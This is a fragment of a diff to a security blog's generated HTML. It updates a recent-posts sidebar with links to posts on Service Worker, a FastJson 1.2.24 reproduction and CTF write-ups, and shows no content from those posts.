href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -3435,6 +3419,10 @@ listener()
       <ul>
         
           <li>
+            <a href="/2020/10/15/Service%20Worker/">Service Worker</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
           </li>
         
@@ -3448,10 +3436,6 @@ listener()
         
           <li>
             <a href="/2020/09/21/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
-          </li>
-        
-          <li>
-            <a href="/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/">羊城杯2020</a>
           </li>
         
       </ul>
